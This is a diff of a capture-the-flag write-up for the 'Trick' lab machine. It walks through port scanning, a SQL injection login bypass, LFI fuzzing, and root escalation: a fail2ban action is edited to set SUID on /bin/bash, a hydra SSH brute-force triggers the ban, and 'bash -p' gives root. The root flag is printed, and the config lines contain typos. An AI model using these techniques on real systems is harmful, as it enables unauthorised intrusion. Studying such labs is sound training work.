@@ -4,6 +4,8 @@
 ### IP = 10.10.11.166
 
 ### NMAP
+
+```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
 | ssh-hostkey: 
@@ -23,6 +25,7 @@ PORT   STATE SERVICE VERSION
 |http-server-header: nginx/1.14.2
 Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+```
 
 ### DNS ENUM
 
@@ -62,10 +65,15 @@ As you can see there are is a domain trick.htb and it's sub domain preprod-payro
 ### Web Enum
 
 When entering http://preprod-payroll.trick.htb you can see a login form but you can bypass it by a simple SQL Injection enter: 
+
+```
 username: ' OR 1=1 -- -
+
 password: sdfsdf
 
-This doesn't lead us to anything so I tried another thing, maybe if I take the top 5000 subdomains file and append it to the preprod- maybe I'll get a new domain to work on.
+```
+
+This doesn't lead us to anything so I kept enumerating, maybe if I take the top 5000 subdomains file and prefix to each line the `preprod-` maybe I'll get a new subdomain to work on.
 
 ### Fuzz
 
@@ -101,11 +109,13 @@ ID           Response   Lines    Word       Chars       Payload
 Interesting we got a new subdomain.
 
 
-http://preprod-marketing.trick.htb
+http://preprod-marketing.trick.htb/
+
 
 So I started doing some recon and saw the `page` parameter interesting, maybe it's vulnerable to LFI:
 
 ```
+
 $ wfuzz -c -f lfi-fighter -w /usr/share/wordlists/LFI_payloads.txt -u 'http://preprod-marketing.trick.htb/index.php?page=FUZZ' --hl 0 
 
 Target: http://preprod-marketing.trick.htb/index.php?page=FUZZ
@@ -203,26 +213,39 @@ Matching Defaults entries for michael on trick:
 
 User michael may run the following commands on trick:
     (root) NOPASSWD: /etc/init.d/fail2ban restart
+
 ```
 
-fail2ban is a system that identifies a brute-force attack and you can exploit it by changing it's `iptables-multiport.conf` file because it's owned by you. 
+fail2ban is a system that identifies a brute-force attack and you can exploit it by changing it's `iptables-multiport.conf` file, because it's owned by you. 
 
 1. `nano /etc/fail2ban/action.d/iptables-multiport.conf`
+
 Now you need to edit this:
-```
+   ```
 
-acitonban = chmod +s /bin/bash
+   acitonban = chmod +s /bin/bash
 
-actionunbam = chmod +s /bin/bash
+   actionunbam = chmod +s /bin/bash
 
-```
+   ```
 
 2. `$ sudo /etc/init.d/fail2ban restart`
-3. while your running step number 2 you need to attack the machine via brute-force.
-`$ hydra -l 0xfad3 -P /usr/share/wordlist/rockyou.txt ssh://trick.htb`
-4. meanwhile /bin/bash file is going to change its permissions 
-5. $ bash -p 
-`root@trick:~# cat root.txt `
-<strong>ee99916ae2ad5baf2ca5da5423b04858</strong>
+3. While your running step 2 you need to attack the machine via brute-force.
 
-more info - https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/ & https://youtu.be/vAlkrw-o7m4?t=2247
+`$ hydra -l 0xfad3 -P /usr/share/wordlist/rockyou.txt ssh://trick.htb`
+
+4. meanwhile /bin/bash file is going to change its permissions to suid.
+
+```
+
+$ bash -p 
+root@trick:~# cat root.txt 
+ee99916ae2ad5baf2ca5da5423b04858
+
+```
+
+
+more info - 
+* https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/ 
+* https://youtu.be/vAlkrw-o7m4?t=2247
+
